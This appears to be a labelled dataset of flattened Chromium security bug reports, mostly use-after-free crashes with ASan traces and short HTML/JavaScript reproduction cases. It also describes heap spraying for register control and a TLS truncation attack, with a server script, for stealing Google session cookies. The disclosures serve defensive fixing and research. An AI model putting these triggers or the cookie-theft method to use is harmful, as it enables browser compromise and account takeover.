7 in openurl b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/html/htmlframeelementbase.cpp:88 8 in notify b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/dom/containernodealgorithms.h:229 9 in updatetreeafterinsertion b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/dom/containernode.cpp:948 10 in appendchild b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/dom/containernode.cpp:685 11 in appendchild b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/dom/node.cpp:574 12 in appendchildmethodcustom b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/bindings/v8/custom/v8nodecustom.cpp:116 13 in handleapicallhelper false b/build/slave/asan_release__symbolized_/build/v8/src/builtins.cc:1327 14 in 15 in 16 in 17 in 18 in 19 in invoke b/build/slave/asan_release__symbolized_/build/v8/src/execution.cc:118 20 in call b/build/slave/asan_release__symbolized_/build/v8/src/api.cc:3891 21 in callfunctionwithinstrumentation b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/bindings/v8/scriptcontroller.cpp:240 22 in callfunction b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/bindings/v8/scriptcontroller.cpp:193 23 in calllistenerfunction b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/bindings/v8/v8lazyeventlistener.cpp:103 24 in invokeeventhandler b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/bindings/v8/v8abstracteventlistener.cpp:138 25 in handleevent b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/bindings/v8/v8abstracteventlistener.cpp:98 26 in fireeventlisteners b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/dom/eventtarget.cpp:257 27 in fireeventlisteners b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/dom/eventtarget.cpp:203 28 in dispatchevent b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/page/domwindow.cpp:1695 29 in dispatchloadevent b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/page/domwindow.cpp:1669 shadow bytes around the buggy address fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap righ redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 7500 aborting version tested with asan build of chromium 193330 under linux reproduction case all required files attached	11
security uaf in ppapi scopedppresource callrelease vulnerability details i ran test case i reported in issue 159429 on chrome and it reproduces again attached a slightly simplified test case version chrome version 27.0.1453.15 beta 28.0.1467.0 192547 trunk build operating system ubuntu 12.04 64 bit reproduction case 1 if you are running this on trunk build copy libpdf.so to out/release folder 2 download and copy test.html to local web server 3 open chrome 4 open test.html chrome will display sad tab for crashes please include the following additional information type of crash tab crash state asan output 5084 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 chrome 0 in ppapi scopedppresource callrelease out/release ppapi/shared_impl/scoped_pp_resource.cc:72 1 in ppb_urlloader_impl out/release webkit/plugins/ppapi/ppb_url_loader_impl.cc:95 2 in ppb_urlloader_impl out/release webkit/plugins/ppapi/ppb_url_loader_impl.cc:88 3 in ppapi resourcetracker releaseresource int out/release ppapi/shared_impl/resource_tracker.cc:84 4 in 0 5 in 0 6 in 0 7 in 0 8 in 0 9 in webkit ppapi anonymous namespace wrapperclass_invoke npobject void npvariant const unsigned int npvariant out/release webkit/plugins/ppapi/plugin_object.cc:92 10 in npn_invoke out/release third_party/webkit/source/webcore/bindings/v8/npv8object.cpp:189 11 in webkit webbindings invoke npp npobject void npvariant const unsigned int npvariant out/release third_party/webkit/source/webkit/chromium/src/webbindings.cpp:133 12 in webkit ppapi anonymous namespace messagechannelinvoke npobject void npvariant const unsigned int npvariant out/release webkit/plugins/ppapi/message_channel.cc:209 13 in webcore npobjectinvokeimpl v8 arguments const webcore invokefunctiontype out/release third_party/webkit/source/webcore/bindings/v8/v8npobject.cpp:118 14 in v8 internal maybeobject v8 internal handleapicallhelper false v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate out/release v8/src/builtins.cc:1327 15 in is located 320 bytes inside of 328-byte region freed by thread t0 chrome here 0 in operator delete void 0 1 in ppapi resource notifyinstancewasdeleted out/release ppapi/shared_impl/resource.cc:70 2 in ppapi resourcetracker diddeleteinstance int out/release ppapi/shared_impl/resource_tracker.cc:154 3 in webkit ppapi hostglobals instancedeleted int out/release webkit/plugins/ppapi/host_globals.cc:251 4 in plugininstance out/release webkit/plugins/ppapi/ppapi_plugin_instance.cc:432 5 in plugininstance out/release webkit/plugins/ppapi/ppapi_plugin_instance.cc:402 6 in scoped_refptr webkit ppapi plugininstance operator webkit ppapi plugininstance out/release base/memory/ref_counted.h:267 7 in webkit ppapi webpluginimpl destroy out/release webkit/plugins/ppapi/ppapi_webplugin_impl.cc:119 8 in webplugincontainerimpl out/release third_party/webkit/source/webkit/chromium/src/webplugincontainerimpl.cpp:629 9 in webplugincontainerimpl out/release third_party/webkit/source/webkit/chromium/src/webplugincontainerimpl.cpp:623 10 in wtf hashtable wtf refptr webcore widget wtf keyvaluepair wtf refptr webcore widget webcore frameview wtf keyvaluepairkeyextractor wtf keyvaluepair wtf refptr webcore widget webcore frameview wtf ptrhash wtf refptr webcore widget wtf keyvaluepairhashtraits wtf hashtraits wtf refptr webcore widget wtf hashtraits webcore frameview wtf hashtraits wtf refptr webcore widget deallocatetable wtf keyvaluepair wtf refptr webcore widget webcore frameview int out/release third_party/webkit/source/wtf/wtf/hashtable.h:1089 11 in webcore widgethierarchyupdatessuspensionscope movewidgets out/release third_party/webkit/source/webcore/rendering/renderwidget.cpp:74 12 in widgethierarchyupdatessuspensionscope out/release third_party/webkit/source/webcore/rendering/renderwidget.h:41 13 in webcore containernode removechild webcore node int out/release third_party/webkit/source/webcore/dom/containernode.cpp:527 14 in webcore collectchildrenandremovefromoldparent webcore node wtf vector wtf refptr webcore node 11ul int out/release third_party/webkit/source/webcore/dom/containernode.cpp:88 15 in webcore containernode appendchild wtf passrefptr webcore node int webcore attachbehavior out/release third_party/webkit/source/webcore/dom/containernode.cpp:664 16 in webcore node appendchild wtf passrefptr webcore node int webcore attachbehavior out/release third_party/webkit/source/webcore/dom/node.cpp:581 17 in webcore v8node appendchildmethodcustom v8 arguments const out/release third_party/webkit/source/webcore/bindings/v8/custom/v8nodecustom.cpp:116 18 in v8 internal maybeobject v8 internal handleapicallhelper false v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate out/release v8/src/builtins.cc:1327 19 in 20 in 21 in 22 in 23 in 24 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool out/release v8/src/execution.cc:118 25 in v8 function call v8 handle v8 object int v8 handle v8 value out/release v8/src/api.cc:3891 26 in webcore scriptcontroller callfunctionwithinstrumentation webcore scriptexecutioncontext v8 handle v8 function v8 handle v8 object int v8 handle v8 value out/release third_party/webkit/source/webcore/bindings/v8/scriptcontroller.cpp:236 27 in webcore scriptcontroller callfunction v8 handle v8 function v8 handle v8 object int v8 handle v8 value out/release third_party/webkit/source/webcore/bindings/v8/scriptcontroller.cpp:189 28 in webcore v8eventlistener calllistenerfunction webcore scriptexecutioncontext v8 handle v8 value webcore event out/release third_party/webkit/source/webcore/bindings/v8/v8eventlistener.cpp:95 29 in webcore v8abstracteventlistener invokeeventhandler webcore scriptexecutioncontext webcore event v8 handle v8 value out/release third_party/webkit/source/webcore/bindings/v8/v8abstracteventlistener.cpp:142 previously allocated by thread t0 chrome here 0 in operator new unsigned long 0 1 in webkit ppapi resourcecreationimpl createurlloader int out/release webkit/plugins/ppapi/resource_creation_impl.cc:242 2 in ppapi thunk anonymous namespace create int out/release ppapi/thunk/ppb_url_loader_thunk.cc:24 3 in 0 4 in	11
security use-after-free removing a frame from its parent in a beforeload event of an object element vulnerability details render process security vulnerability a renderarena use-after-free happens when removing the current frame from its parent in a beforeload event attached to an object element child of current frame body spraying some data with js allows a full control of eax then a call 724 eax happens chrome dev offset forging a complete vtable is of course possible with some info leak and would allow a control of the pc version verified on google chrome 26.0.1410.43 stable debugged on chromium 28.0.1461.0 191833 dev release build with symbols gyp_generators=ninja gyp_defines='component=shared_library mac_strip_release=0 operating system osx 10.8.2 reproduction case open the attached object-beforeload-chrome.html to reproduce the bug for crashes please include the following additional information type of crash rendering process sad tab crash state see the lldb trace js comment in the attached object-beforeload-chrome.html client id if relevant crash report file name 4170e48a-e664-4a80-8e8c-d91a3009e3ea.dmp client id f909b5c0-6752-4793-f6a5-5853e12d44a6	11
use after free using speech api after loading a web page hi again 1 open poc.html 2 in poc.html we have speech api and then after almost a second it s loading google page so you should click only one click before loading of google page and you can get speech api then after loading of google page you can see speech api it s still on page even after changing of the page 3 then you can see a message on speech api speech recognition was aborted and click on try again button and chrome will crash 0:017 k childebp retaddr 0572f98c 034c2d23 chrome_1c30000 anonymous namespace purecall c b\build\slave\win\build\src\content\app\startup_helper_win.cc 24 0572f9ac 031e179e chrome_1c30000 purecall f dd\vctools\crt_bld\self_x86\crt\src\purevirt.c 54 0572faa8 031e055b chrome_1c30000 content speechrecognitionmanagerimpl recognitionallowedcallback c b\build\slave\win\build\src\content\browser\speech\speech_recognition_manager_impl.cc 182 0572fac0 031e05b9 chrome_1c30000 base internal invokehelper 1 void base internal runnableadapter void thiscall content speechrecognitionmanagerimpl int bool bool void cdecl base weakptr content speechrecognitionmanagerimpl const int const bool const bool const makeitso c b\build\slave\win\build\src\base\bind_internal.h 973 0572fae0 02bf1d77 chrome_1c30000 base internal invoker 2 base internal bindstate base internal runnableadapter void thiscall content speechrecognitionmanagerimpl int bool bool void cdecl content speechrecognitionmanagerimpl int bool bool void cdecl base weakptr content speechrecognitionmanagerimpl int void cdecl content speechrecognitionmanagerimpl int bool bool run c b\build\slave\win\build\src\base\bind_internal.h 1495 0572faf4 02b1f100 chrome_1c30000 base internal invokehelper 0 void base callback void cdecl int std vector history mostvisitedurl std allocator history mostvisitedurl void cdecl int const std vector history mostvisitedurl std allocator history mostvisitedurl const makeitso c b\build\slave\win\build\src\base\bind_internal.h 899 0572fb0c 01c622f7 chrome_1c30000 base internal invoker 2 base internal bindstate base callback void cdecl bool bool void cdecl bool bool void cdecl bool bool void cdecl bool bool run c b\build\slave\win\build\src\base\bind_internal.h 1257 0572fb68 01c62072 chrome_1c30000 messageloop runtask c b\build\slave\win\build\src\base\message_loop.cc 475 0572fcb8 01c6519b chrome_1c30000 messageloop dowork c b\build\slave\win\build\src\base\message_loop.cc 669 0572fd1c 01c650a9 chrome_1c30000 base messagepumpforio dorunloop c b\build\slave\win\build\src\base\message_pump_win.cc 523 0572fd3c 01c61cd2 chrome_1c30000 base messagepumpwin run c b\build\slave\win\build\src\base\message_pump_win.h 48 0572fd60 01c61c2a chrome_1c30000 messageloop runinternal c b\build\slave\win\build\src\base\message_loop.cc 431 0572fd70 01c65043 chrome_1c30000 base runloop run c b\build\slave\win\build\src\base\run_loop.cc 46 0572fd98 01d5707f chrome_1c30000 base thread run c b\build\slave\win\build\src\base\threading\thread.cc 150 0572fe68 01d42294 chrome_1c30000 content browserthreadimpl iothreadrun c b\build\slave\win\build\src\content\browser\browser_thread_impl.cc 150 0572fe7c 01c64eaa chrome_1c30000 content browserthreadimpl run c b\build\slave\win\build\src\content\browser\browser_thread_impl.cc 177 0572ffa8 01c64dcc chrome_1c30000 base thread threadmain c b\build\slave\win\build\src\base\threading\thread.cc 199 0572ffb4 7c80b713 chrome_1c30000 base anonymous namespace threadfunc c b\build\slave\win\build\src\base\threading\platform_thread_win.cc 60 warning stack unwind information not available following frames may be wrong 0572ffec 00000000 kernel32 getmodulefilenamea	11
security tls truncation attack on http headers including cookie flags version chrome version 27.0.1453.94 stable operating system tested on windows vulnerability details chrome unlike firefox ie or opera attempts to defend against tls truncation attacks by enforcing the content-length header to match the length of the query s response body length however like all other browsers it does n't implement the mandatory tls closure alert enforcement from tls 1.1 to prevent truncation attacks at the transport layer we discovered that in chome safari and opera an https response truncated in the headers part was still processed by the browser in particular all set-cookie headers are parsed even in the truncation occurs within a set-cookie line this is a critical problem because a network attacker is able to cut the secure and httponly flags from a cookie and subsequently steal its value reproduction case the following php script creates an https server that sends a truncated response to any query containing a single truncated cookie the truncation occurs by tcp rset when the page is accessed at and the self-signed security warning is ignored the cookie appears in the resources tab of the developer tools serv stream_socket_server tls 0.0.0.0:88 set to any self signed certificate with private key stream_context_set_option serv ssl local_cert etc/ssl/localhost.pem while conn stream_socket_accept serv for b r=fread conn,1024 trim r fwrite conn http/1.1 200 ok\r\n set-cookie test=value no line feed stream_socket_shutdown conn stream_shut_rdwr threat model an active network attacker is required to exploit this attack by truncating the target tls session example attack we were able to exploit this attack to steal google accounts sessions such sessions grant access to all google services including gmail the main difficulty in building an exploit is to get some plaintext or padding control in the response of the http request to truncate to be able to select the fragmentation point fortunately there is a semi-open redirector in the google accounts login page and in similar services through the continue parameter containing an url to redirect the user to after login e.g even though accounts.google.com is protected by hsts it is safe to assume that the continue parameter is under attacker control because many of the google login buttons are sent over http for instance on but also youtube and others when the user submits valid credentials the response is a redirect to value that includes many set-cookie headers for gaps nid sid lsid hsid ssid apisid sapisid among those only gaps lsid ssid and sapisid have the secure flag furthermore only ssid is required to process login requests on accounts.google.com finally these cookies all have a constant length and they appear after the location header containing the attacker-controlled padding the goal of the attacker is to chose the continue length such that fragmentation will occur immediately after set-cookie ssid=xxx domain=.google.com path expires=yyy this is generally easy because all google servers use a constant fragment size of 1345 bytes the network attacker injects a tcp fin immediately after the target fragment and because of the above bug the ssid cookie will be saved without the secure flag set only apisid and sapisid appear after ssid and they are not necessary to the attacker once the connection is truncated the attacker either waits for or causes a request to e.g by redirect-hijacking any other http request from the user to recover all non-secure cookies including sid this session can be used to log into the user s gmail account among others as a side note when chrome is configured with allow-chrome-signin the response also contains a google-accounts-signin header with the user s email address before the cookies thus on chrome it may be necessary to guess the victim s account name length mitigations the proper fix to this issue is to enforce closure alerts in accordance with the tls 1.1 specification however since this causes compatibility and performance issues it is at least important to never accept cookies from a truncated request i.e missing a request body even empty other browsers are affected in various degrees and will be notified advisories will be sent to major vulnerable applications such as google to mitigate the issue by setting all secure cookies at the very top of the response headers	9
security checkduplicatehandle breakdebugger browser crash with web workers and websql vulnerability details chrome browser process crashes with a checkduplicatehandle breakdebugger crash when 1 minimized script the browser s history is erased minimized case while multiple webworkers are triggering a reload from their onmessage event 2 extended script same as 1 but does not require erasing history the log is the same in both cases 3612:3504:0523/165945 fatal sandbox_win.cc 426 check failed basic_info.grantedaccess kdangerousmask you are attempting to duplicate a privileged handle into a sandboxed process please use the sandbox brokerduplicatehandle api or contact security chromium.org for assistance version chrome version all 29.0.1517.0 used issue may be more reliable on recent tot versions operating system windows xp sp3 and others reproduction case 1 launch the minimized script with a clean profile and fully erase history 2 launch the extended script with a clean profile for crashes please include the following additional information type of crash browser crash state see added trace/log files	11
escalate access to browser internals useragent mozilla/5.0 macintosh intel mac os x 10_7_5 applewebkit/537.36 khtml like gecko chrome/27.0.1453.81 safari/537.36 steps to reproduce the problem 1 set up a setter for console._commandlineapi javascript console.__definesetter commandlineapi function e var internal arguments.callee.caller.arguments.callee.caller.arguments 1 internal.databaseid 42424242 2 open the js console inspector use the console enter a couple of characters 4 watch the crash verify that you have access to the injectedscripthost-object what is the expected behavior privilege escalation to internal scope and/or crash what went wrong the code path from public to internal scope has not been removed did this work before n/a chrome version 27.0.1453.81 channel stable os version os x 10.7.5 there are more internal interfaces like this they all seem rather unfuzzed	11
heap-use-after-free in webcore basemultiplefieldsdateandtimeinputtype basemultiplefieldsdateandtimeinputtype vulnerability details use-after-free with input and focusout handler version chrome version stable dev operating system 64bit ubuntu reproduction case html head style style script onload function el0=document.createelement input document.body.appendchild el0 el0.type='month el0.autofocus x el1=document.createelement div document.body.appendchild el1 el2=document.createelement div el1.appendchild el2 el2.appendchild document.createtextnode a document.body.addeventlistener focusout function el0.type='week document.designmode='on document.execcommand selectall document.execcommand bold script head body body html for crashes please include the following additional information type of crash asan+renderer crash state 23868 error addresssanitizer heap-use-after-free on address at pc bp sp write of size 8 at thread t0 asan-stable 0 in removespinbuttonowner mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/webcore/html/shadow/spinbuttonelement.h:60:0 1 in webcore basemultiplefieldsdateandtimeinputtype basemultiplefieldsdateandtimeinputtype mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/webcore/html/basemultiplefieldsdateandtimeinputtype.cpp:174:0 2 in weekinputtype mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/webcore/html/weekinputtype.h:46:0 3 in weekinputtype is located 104 byt freed by thread t0 asan-stable 0 in operator 1 in deref m 2 in derefifn 3 in refptr 4 in refptr	11
heap-use-after-free in webcore imageinputtype attach vulnerability details use-after-free with input type image version chrome version stable dev operating system 64bit ubuntu reproduction case html body input id x type image onerror x.type src body html for crashes please include the following additional information type of crash renderer asan crash state 6146==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 asan-release 0 in element b/build/slave/asan_release/build/third_party/webkit/source/core/html/inputtype.h:309 1 in attach b/build/slave/asan_release/build/third_party/webkit/source/core/html/htmlinputelement.cpp:775 2 in insert b/build/slave/asan_release/build/third_party/webkit/source/core/html/parser/htmlconstructionsite.cpp:110 3 in executeinserttask is located 8 bytes inside of 24-byte region freed by thread t0 asan-release here 0 in operator delete void 0 1 in deleteownedptr webcore inputtype b/build/slave/asan_release/build/third_party/webkit/source/wtf/ownptrcommon.h:47 2 in parseattribute b/build/slave/asan_release/build/third_party/webkit/source/core/html/htmlinputelement.cpp:627 3 in attributechanged	11
tab crashes when changing audio element source when used with web audio api useragent mozilla/5.0 windows nt 6.1 wow64 applewebkit/537.36 khtml like gecko chrome/28.0.1499.0 safari/537.36 example url steps to reproduce the problem 1 place an audio element on a page 2 create a webkitaudiocontext 3 use the webkitaudiocontext to create a mediaelementaudiosourcenode from the audio element 4 programmatically change the source of the audio element by removing its child source node s and replacing it them this can also be done via direct modification of the source element s src attribute 5 use the load method of the audio element to load the new audio source what is the expected behavior the new source should be loaded by the audio element in place what went wrong replacing the source of an audio element which is the target of a medilaelementaudiosourcenode results in a crash of the browser tab in which it is hosted this does not occur when the audio element has not been used in conjunction with the web audio api did this work before no is it a problem with flash or html5 html5 does this work in other browsers n/a chrome version 28.0.1499.0 channel canary os version 6.1 windows 7 windows server 2008 r2 this issue only occurs when the audio element is being used via mediaelementaudiosourcenode in a web audio api audiocontext therefore it seems likely that the media element source node implementation is not prepared to handle source switching after instantiation an attempt to destroy the source node and re-initialize it fails with domexception 11 disconnecting the source node from the rest of the audio context filtergraph does not appear to have any effect removing the audio element in its entirety and replacing it with a new element does appear to be a workaround to this issue though it is not ideal as it requires the filtergraph to be rebuilt a mediaelementaudiosourcenode should tolerate changes to the underlying audio element an example of the workaround can be found here i have tested this on chrome 26.0.1410.64 stable as well wherein the crash will not occur until playback is initiated after audio source replacement	11
cross-origin named subframe access leaks cross-origin subframes of the same name vulnerability details this is really a spec issue i think but given that there s no way to file security-sensitive html5 bugs i m just filing bugs on all the affected vendors we can fix the spec once everyone is in good shape here the basic problem is as follows since window is not overridebuiltins named subframes are not supposed to be able to shadow builtin properties so if a page has an iframe with name localstorage resolving localstorage in global scope should still give the storage object rather than the subframe window this seems to be the behavior in the uas i ve tested however we run into trouble when we throw cross-origin access to named subframes into the mix the spec currently does n't allow this but all uas do so i d previously filed 1 to make the spec match reality on this issue most uas seem to implement cross-origin security checks by a whitelist of properties followed by an isframeindexorname-esque check for indexed and named subframes so the same-origin policy enforcement ends up granting access to any name that matches a subframe name but the subsequent lookup ends up selecting the builtin property over the subframe creating a cross-origin leak due to some other implementational wonkiness this was a non-issue in gecko until firefox 22 currently aurora still 8 weeks from release while fixing that wonkiness i discovered this issue and fixed it on nightly and aurora in 2 i then did some cross-browser testing and discovered that this was a problem in chrome and a worse one because security wrappers mostly save us here in gecko in my testcase chrome leaks localstorage and navigator safari and ie do n't leak anything afaict the solution i implemented in 2 was to deny cross-origin access at policy enforcement time to named subframes that would end up resolving to a non-cross-origin-accessible property of the window this seems like the safest behavior to me but i m happy to discuss alternatives with everyone if that turns out to be difficult for other vendors to implement 1 2 version stable reproduction case testcases attached put a and b on cross-origin hosts and update the url in a	2
security u-a-f in shared worker process in allow indexeddb filesystem mainthreadbridge vulnerability details chrome crashes in commonclient allowindexeddb name allowindexeddbmainthreadbridge allowindexeddbtask with a zero d scriptexecutioncontext when an idb open or deletedatabase call is used in a shared worker with a location.reload call in its onmessage event the crash/issue on windows xp is a bad instruction pointer while on windows 7 it causes an invalid handle crash with stack corruption probably caused by a non-idb shared worker issue the added repro causes an invalid handle crash with corruption on windows 7 even with all idb code removed from the script version chrome version stable v26.0.1410.43 tot v28.0.1459.0 operating system windows xp sp3 windows 7 sp1 32-bit reproduction case load the added repro file for crashes please include the following additional information type of crash tab/child process crash state check added trace files	11
heap-use-after-free in webcore renderobject container vulnerability details race condition user-after-free with svg version chrome version dev operating system linux osx reproduction case html head script onload function el0=document.createelementns svg document.body.appendchild el0 el1=document.createelementns rect el0.appendchild el1 el2=document.createelementns svg document.body.appendchild el2 el3=document.createelementns clippath el3.setattribute id el3 el2.appendchild el3 settimeout function el2.setattribute clip-path url el3 el4=document.createelementns animate el1.appendchild el4 el4.setattribute attributename x el4.setattribute dur 100ms settimeout location.reload 100 10 script head body body html for crashes please include the following additional information type of crash renderer asan crash state 24830 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 asan-release 0 in parent b/build/slave/asan_release/build/third_party/webkit/source/webcore/rendering/renderobject.h:166 1 in markcontainingblocksforlayout is located 24 bytes inside of 352-byte region freed by thread t0 asan-release here 0 in free 0 1 in detach b/build/slave/asan_release/build/third_party/webkit/source/webcore/dom/node.cpp:1114 2 in detach b/build/slave/asan_release/build/third_party/webkit/source/webcore/dom/element.cpp:1310	11
use-after-free on net sslclientsocketnss core onsendcomplete this crash has been found by the last syzyasan canary 28.0.1477.2 error type read of size 4 alloc_stack 62 void alloc_stack_size free_stack 62 void free_stack_size error_type 1 use_after_free shadow_info 128 is located 419 bytes inside of 524-bytes region stack trace of the crash chrome net sslclientsocketnss core onsendcomplete c b\build\slave\win-asan\build\src\net\socket\ssl_client_socket_nss.cc 2272 chrome net sslclientsocketnss core buffersendcomplete c b\build\slave\win-asan\build\src\net\socket\ssl_client_socket_nss.cc 2680 chrome base internal invoker 1 base internal bindstate base internal runnableadapter void thiscall net anonymous namespace dnsudpattempt int void cdecl net anonymous namespace dnsudpattempt int void cdecl base internal unretainedwrapper net anonymous namespace dnsudpattempt void cdecl net anonymous namespace dnsudpattempt int run c b\build\slave\win-asan\build\src\base\bind_internal.h 1229 chrome net tcpclientsocketwin dowritecallback c b\build\slave\win-asan\build\src\net\socket\tcp_client_socket_win.cc 911 chrome net tcpclientsocketwin didcompletewrite c b\build\slave\win-asan\build\src\net\socket\tcp_client_socket_win.cc 1003 chrome net tcpclientsocketwin core writedelegate onobjectsignaled c b\build\slave\win-asan\build\src\net\socket\tcp_client_socket_win.cc 327 chrome base win objectwatcher signal c b\build\slave\win-asan\build\src\base\win\object_watcher.cc 102 chrome base internal invoker 2 base internal bindstate base internal runnableadapter void thiscall base win objectwatcher base win objectwatcher delegate void cdecl base win objectwatcher base win objectwatcher delegate void cdecl base weakptr base win objectwatcher base win objectwatcher delegate void cdecl base win objectwatcher base win objectwatcher delegate run c b\build\slave\win-asan\build\src\base\bind_internal.h 1258 chrome base messageloop runtask c b\build\slave\win-asan\build\src\base\message_loop.cc 474 chrome base messageloop dowork c b\build\slave\win-asan\build\src\base\message_loop.cc 670 chrome base messagepumpforio dorunloop c b\build\slave\win-asan\build\src\base\message_pump_win.cc 523 chrome base messagepumpwin run c b\build\slave\win-asan\build\src\base\message_pump_win.h 48 chrome base messageloop runinternal c b\build\slave\win-asan\build\src\base\message_loop.cc 432 chrome base runloop run c b\build\slave\win-asan\build\src\base\run_loop.cc 45 chrome base thread run c b\build\slave\win-asan\build\src\base\threading\thread.cc 152 chrome content browserthreadimpl iothreadrun c b\build\slave\win-asan\build\src\content\browser\browser_thread_impl.cc 163 chrome content browserthreadimpl run c b\build\slave\win-asan\build\src\content\browser\browser_thread_impl.cc 190 chrome base thread threadmain c b\build\slave\win-asan\build\src\base\threading\thread.cc 197 chrome base anonymous namespace threadfunc c b\build\slave\win-asan\build\src\base\threading\platform_thread_win.cc 58 kernel32 basethreadinitthunk ntdll rtluserthreadstart ntdll rtluserthreadstart allocation stack trace asan_rtl agent asan heapproxy alloc e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_heap.cc 191 asan_rtl asan_heapalloc e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_rtl_impl.cc 100 chrome generic_cpp_alloc c b\build\slave\win-asan\build\src\base\allocator\generic_allocators.cc 16 chrome net sslclientsocketnss initcore c b\build\slave\win-asan\build\src\net\socket\ssl_client_socket_nss.cc 3091 chrome net sslclientsocketnss sslclientsocketnss c b\build\slave\win-asan\build\src\net\socket\ssl_client_socket_nss.cc 2793 chrome net anonymous namespace defaultclientsocketfactory createsslclientsocket c b\build\slave\win-asan\build\src\net\socket\client_socket_factory.cc 109 chrome net sslconnectjob dosslconnect c b\build\slave\win-asan\build\src\net\socket\ssl_client_socket_pool.cc 281 chrome net sslconnectjob doloop c b\build\slave\win-asan\build\src\net\socket\ssl_client_socket_pool.cc 174 chrome net sslconnectjob connectinternal c b\build\slave\win-asan\build\src\net\socket\ssl_client_socket_pool.cc 411 chrome net connectjob connect c b\build\slave\win-asan\build\src\net\socket\client_socket_pool_base.cc 71 chrome net internal clientsocketpoolbasehelper requestsocketinternal c b\build\slave\win-asan\build\src\net\socket\client_socket_pool_base.cc 358 chrome net internal clientsocketpoolbasehelper requestsocket c b\build\slave\win-asan\build\src\net\socket\client_socket_pool_base.cc 240 chrome net clientsocketpoolbase net sslsocketparams requestsocket c b\build\slave\win-asan\build\src\net\socket\client_socket_pool_base.h 672 chrome net clientsockethandle init net sockssocketparams net socksclientsocketpool c b\build\slave\win-asan\build\src\net\socket\client_socket_handle.h 230 chrome net anonymous namespace initsocketpoolhelper c b\build\slave\win-asan\build\src\net\socket\client_socket_pool_manager.cc 248 chrome net initsockethandleforhttprequest c b\build\slave\win-asan\build\src\net\socket\client_socket_pool_manager.cc 387 chrome net httpstreamfactoryimpl job doinitconnection c b\build\slave\win-asan\build\src\net\http\http_stream_factory_impl_job.cc 794 chrome net httpstreamfactoryimpl job doloop c b\build\slave\win-asan\build\src\net\http\http_stream_factory_impl_job.cc 536 chrome net httpstreamfactoryimpl job runloop c b\build\slave\win-asan\build\src\net\http\http_stream_factory_impl_job.cc 399 chrome net httpstreamfactoryimpl job startinternal c b\build\slave\win-asan\build\src\net\http\http_stream_factory_impl_job.cc 569 chrome net httpstreamfactoryimpl job start c b\build\slave\win-asan\build\src\net\http\http_stream_factory_impl_job.cc 136 chrome net httpstreamfactoryimpl requeststream c b\build\slave\win-asan\build\src\net\http\http_stream_factory_impl.cc 107 chrome net httpnetworktransaction docreatestream c b\build\slave\win-asan\build\src\net\http\http_network_transaction.cc 638 chrome net httpnetworktransaction doloop c b\build\slave\win-asan\build\src\net\http\http_network_transaction.cc 537 chrome net httpnetworktransaction start c b\build\slave\win-asan\build\src\net\http\http_network_transaction.cc 181 chrome net httpcache transaction dosendrequest c b\build\slave\win-asan\build\src\net\http\http_cache_transaction.cc 796 chrome net httpcache transaction doloop c b\build\slave\win-asan\build\src\net\http\http_cache_transaction.cc 572 chrome net httpcache transaction oniocomplete c b\build\slave\win-asan\build\src\net\http\http_cache_transaction.cc 2348 chrome base internal invokehelper 1 void base internal runnableadapter void thiscall webkit ppapi quotafileio setlengthoperation enum base platformfileerror void cdecl base weakptr webkit ppapi quotafileio setlengthoperation const enum base platformfileerror const makeitso c b\build\slave\win-asan\build\src\base\bind_internal.h 911 chrome base internal invoker 1 base internal bindstate base internal runnableadapter void thiscall webkit ppapi quotafileio setlengthoperation enum base platformfileerror void cdecl webkit ppapi quotafileio setlengthoperation enum base platformfileerror void cdecl base weakptr webkit ppapi quotafileio setlengthoperation void cdecl webkit ppapi quotafileio setlengthoperation enum base platformfileerror run c b\build\slave\win-asan\build\src\base\bind_internal.h 1228 chrome net httpcache workitem notifytransaction c b\build\slave\win-asan\build\src\net\http\http_cache.cc 144 chrome net httpcache oniocomplete c b\build\slave\win-asan\build\src\net\http\http_cache.cc 1039 chrome net httpcache onpendingopcomplete c b\build\slave\win-asan\build\src\net\http\http_cache.cc 1088 chrome base internal invoker 2 base internal bindstate base internal runnableadapter base value cdecl net netlog source const std basic_string char std char_traits char std allocator char const enum net netlog loglevel base value cdecl net netlog source const std basic_string char std char_traits char std allocator char const enum net netlog loglevel void cdecl net netlog 